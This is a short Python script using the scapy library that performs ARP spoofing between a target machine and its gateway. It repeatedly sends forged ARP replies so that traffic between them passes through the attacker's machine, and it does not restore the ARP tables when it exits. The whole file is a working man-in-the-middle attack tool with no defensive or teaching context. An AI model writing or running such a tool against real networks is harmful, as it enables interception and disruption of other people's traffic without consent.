#!/usr/bin/python
import scapy.all as scapy
import time
import sys
import optparse
import optparse
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='target_ip_addr', help='IP address of Target machine.')
    parser.add_option('-g', '--gateway', dest='gateway_ip_addr', help='IP address of Gateway.')
    (options, arguments) = parser.parse_args()
    if not options.target_ip_addr:
        parser.error("\n[-] Please specify target IP address. Use -h or --help for more information.")
    elif not options.gateway_ip_addr:
        parser.error("\n[-] Please specify gateway IP address. Use -h or --help for more information.")
    target_ip_addr = options.target_ip_addr
    gateway_ip_addr = options.gateway_ip_addr
    return target_ip_addr, gateway_ip_addr
target_ip, gateway_ip = get_arguments()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether()
    arp_broadcst = broadcast/arp_request
    answered_list = scapy.srp(arp_broadcst, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, count=4, verbose=False)


try:

    packet_number = 2
    print("Program starting.")
    print("Press Ctrl + C to close program")
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)
        print("\r[+] Packet sent: " + str(packet_number)),
        sys.stdout.flush()
        time.sleep(1)
        packet_number+=2

except KeyboardInterrupt:
    print("\n\n\n[+] Detected Ctrl + C.\nClosing the program.")